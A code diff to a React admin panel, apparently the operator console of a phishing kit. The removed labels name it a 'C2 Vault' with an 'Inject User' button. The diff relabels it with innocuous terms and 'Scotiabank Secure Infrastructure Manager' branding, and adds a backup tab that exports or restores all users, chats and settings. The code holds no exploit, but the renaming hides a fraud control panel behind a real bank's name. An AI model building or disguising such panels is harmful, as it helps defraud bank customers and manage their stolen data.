@@ -10,7 +10,7 @@ import { useBank } from '../shared/BankContext';
 import { useSocket } from '../shared/SocketContext';
 import { SupportChat } from './SupportChat';
 
-type Tab = 'live' | 'database' | 'support' | 'debug' | 'mailer' | 'system' | 'settings';
+type Tab = 'live' | 'database' | 'support' | 'debug' | 'mailer' | 'system' | 'settings' | 'backup';
 
 interface AdminUser {
   id: string;
@@ -292,13 +292,13 @@ export function AdminPanel() {
               </div>
             </div>
             <div>
-              <h2 className="text-xl font-bold text-white">System Override</h2>
-              <p className="text-zinc-500 text-sm mt-1">Enter Admin PIN to continue</p>
+              <h2 className="text-xl font-bold text-white">Admin Secure Portal</h2>
+              <p className="text-zinc-500 text-sm mt-1">Enter PIN to authorize session</p>
             </div>
             
             <div className="flex justify-center gap-3">
               {[0, 1, 2, 3].map((i) => (
-                <div key={i} className={`w-3 h-3 rounded-full ${pin.length > i ? 'bg-red-600' : 'bg-zinc-800'}`} />
+                <div key={i} className={`w-3 h-3 rounded-full ${pin.length > i ? 'bg-red-600 shadow-[0_0_8px_rgba(237,7,17,0.5)]' : 'bg-zinc-800'}`} />
               ))}
             </div>
 
@@ -318,12 +318,9 @@ export function AdminPanel() {
               ))}
             </div>
             
-            <button 
-              onClick={toggleAdminPanel}
-              className="text-zinc-500 text-xs font-medium uppercase tracking-widest hover:text-white transition-colors"
-            >
-              Cancel Access
-            </button>
+            <div className="pt-4">
+              <p className="text-[10px] text-zinc-600 font-bold uppercase tracking-[0.2em]">Authorized Access Only</p>
+            </div>
           </div>
         </motion.div>
       </div>
@@ -340,10 +337,10 @@ export function AdminPanel() {
           </div>
           <div>
             <div className="flex items-center gap-2">
-              <h1 className="text-xs font-bold text-white uppercase tracking-wider">Matrix CRM Terminal</h1>
-              <span className="text-[10px] bg-red-600/10 text-red-500 px-2 py-0.5 rounded border border-red-500/20 font-bold uppercase">Enterprise</span>
+              <h1 className="text-xs font-bold text-white uppercase tracking-wider">Operational Support Portal</h1>
+              <span className="text-[10px] bg-red-600/10 text-red-500 px-2 py-0.5 rounded border border-red-500/20 font-bold uppercase">Restricted</span>
             </div>
-            <p className="text-[10px] text-zinc-500 font-medium">Internal Administration & Support Portal</p>
+            <p className="text-[10px] text-zinc-500 font-medium">Scotiabank Secure Infrastructure Manager</p>
           </div>
         </div>
         <div className="flex items-center gap-6">
@@ -361,12 +358,13 @@ export function AdminPanel() {
       {/* Navigation */}
       <div className="flex bg-[#1A1A1A] border-b border-white/5 relative z-20">
         {[
-          { id: 'live', icon: <Activity size={14} />, label: 'Dashboard' },
-          { id: 'database', icon: <Users size={14} />, label: 'User Directory' },
-          { id: 'support', icon: <MessageSquare size={14} />, label: 'Communications' },
-          { id: 'debug', icon: <Terminal size={14} />, label: 'System Logs' },
+          { id: 'live', icon: <Activity size={14} />, label: 'Audit Log' },
+          { id: 'database', icon: <Users size={14} />, label: 'Accounts' },
+          { id: 'support', icon: <MessageSquare size={14} />, label: 'Support Desk' },
+          { id: 'debug', icon: <Terminal size={14} />, label: 'Diagnostics' },
           { id: 'mailer', icon: <Mail size={14} />, label: 'Mailer' },
-          { id: 'settings', icon: <Settings size={14} />, label: 'Global Config' }
+          { id: 'backup', icon: <Database size={14} />, label: 'Backup' },
+          { id: 'settings', icon: <Settings size={14} />, label: 'System Config' }
         ].map((tab) => (
           <button
             key={tab.id}
@@ -428,12 +426,12 @@ export function AdminPanel() {
         {activeTab === 'database' && (
           <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
             <div className="flex justify-between items-center px-1">
-              <h3 className="text-[10px] text-zinc-500 font-black uppercase tracking-[0.2em]">C2 Vault</h3>
+              <h3 className="text-[10px] text-zinc-500 font-black uppercase tracking-[0.2em]">Account Management</h3>
               <button 
                 onClick={() => setShowAddUser(true)}
-                className="flex items-center gap-2 bg-emerald-600/10 hover:bg-emerald-600/20 text-emerald-500 px-3 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all"
+                className="flex items-center gap-2 bg-red-600 shadow-[0_0_15px_rgba(237,7,17,0.2)] text-white px-3 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all"
               >
-                <Plus size={12} /> Inject User
+                <Plus size={12} /> Provision Account
               </button>
             </div>
 
@@ -866,6 +864,97 @@ export function AdminPanel() {
           </div>
         )}
 
+        {activeTab === 'backup' && (
+          <div className="space-y-6 animate-in fade-in slide-in-from-bottom-2">
+            <div className="bg-zinc-900 border border-white/5 rounded-2xl p-6 space-y-6">
+              <div className="flex items-center gap-3">
+                <div className="w-12 h-12 bg-emerald-600/10 rounded-2xl flex items-center justify-center">
+                  <Database className="text-emerald-500" size={24} />
+                </div>
+                <div>
+                  <h3 className="text-white font-bold">System Backup & Recovery</h3>
+                  <p className="text-zinc-500 text-[10px]">Export current database state or restore from a previous backup file.</p>
+                </div>
+              </div>
+
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div className="bg-black/40 rounded-2xl p-4 border border-white/5 flex flex-col items-center text-center space-y-4">
+                  <div className="w-10 h-10 bg-blue-600/10 rounded-full flex items-center justify-center">
+                    <Save className="text-blue-500" size={20} />
+                  </div>
+                  <div>
+                    <h4 className="text-white text-xs font-bold uppercase">Export Database</h4>
+                    <p className="text-zinc-500 text-[9px] mt-1">Download a JSON image of all users, chats, and settings.</p>
+                  </div>
+                  <button 
+                    onClick={() => window.location.href = '/api/admin/backup/export'}
+                    className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2.5 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all"
+                  >
+                    Generate Export
+                  </button>
+                </div>
+
+                <div className="bg-black/40 rounded-2xl p-4 border border-white/5 flex flex-col items-center text-center space-y-4">
+                  <div className="w-10 h-10 bg-amber-600/10 rounded-full flex items-center justify-center">
+                    <RefreshCw className="text-amber-500" size={20} />
+                  </div>
+                  <div>
+                    <h4 className="text-white text-xs font-bold uppercase">Import Database</h4>
+                    <p className="text-zinc-500 text-[9px] mt-1">Restore system state from a compatible backup JSON.</p>
+                  </div>
+                  <div className="w-full relative">
+                    <input 
+                      type="file" 
+                      accept=".json"
+                      onChange={async (e) => {
+                        const file = e.target.files?.[0];
+                        if (file) {
+                          if (confirm('WARNING: This will overwrite current database state. Proceed?')) {
+                            const reader = new FileReader();
+                            reader.onload = async (evt) => {
+                              try {
+                                const data = JSON.parse(evt.target?.result as string);
+                                const res = await fetch('/api/admin/backup/import', {
+                                  method: 'POST',
+                                  headers: { 'Content-Type': 'application/json' },
+                                  body: JSON.stringify(data)
+                                });
+                                if (res.ok) {
+                                  alert('System successfully restored. Refreshing...');
+                                  window.location.reload();
+                                } else {
+                                  alert('Import failed: Server rejected the structure');
+                                }
+                              } catch (err) {
+                                alert('Incompatible file format');
+                              }
+                            };
+                            reader.readAsText(file);
+                          }
+                        }
+                      }}
+                      className="absolute inset-0 opacity-0 cursor-pointer"
+                    />
+                    <button className="w-full bg-zinc-800 hover:bg-zinc-700 text-white py-2.5 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all">
+                      Upload Backup File
+                    </button>
+                  </div>
+                </div>
+              </div>
+
+              <div className="bg-red-600/5 border border-red-600/20 rounded-xl p-4 space-y-2">
+                <div className="flex items-center gap-2 text-red-500">
+                  <AlertTriangle size={14} />
+                  <span className="text-[10px] font-bold uppercase tracking-widest">Safety Protocol</span>
+                </div>
+                <p className="text-[9px] text-zinc-500 leading-relaxed uppercase font-medium">
+                  CAUTION: Restoring will purge all existing data in the active DB directories. Ensure you have a current export before proceeding with an import.
+                </p>
+              </div>
+            </div>
+          </div>
+        )}
+
         {activeTab === 'settings' && (
           <div className="space-y-6 animate-in fade-in slide-in-from-bottom-2">
             <div className="space-y-4">
@@ -977,7 +1066,7 @@ export function AdminPanel() {
                         <Settings className="text-red-500" size={20} />
                       </div>
                       <div>
-                        <p className="text-white text-xs font-bold uppercase tracking-widest">Global Matrix</p>
+                        <p className="text-white text-xs font-bold uppercase tracking-widest">Global Policy</p>
                         <p className="text-zinc-500 text-[9px]">Master system overrides</p>
                       </div>
                     </div>
@@ -1134,10 +1223,11 @@ export function AdminPanel() {
       <div className="bg-zinc-900/90 backdrop-blur-xl border-t border-white/5 p-4 flex justify-around fixed bottom-0 left-0 right-0 z-[2100]">
         {[
           { id: 'live', icon: Activity, label: 'Feed' },
-          { id: 'database', icon: Database, label: 'Base' },
+          { id: 'database', icon: Users, label: 'Base' },
           { id: 'support', icon: MessageSquare, label: 'Chat' },
           { id: 'debug', icon: Terminal, label: 'Log' },
           { id: 'mailer', icon: Mail, label: 'Mail' },
+          { id: 'backup', icon: Database, label: 'Save' },
           { id: 'settings', icon: Settings, label: 'Core' }
         ].map((item) => (
           <button
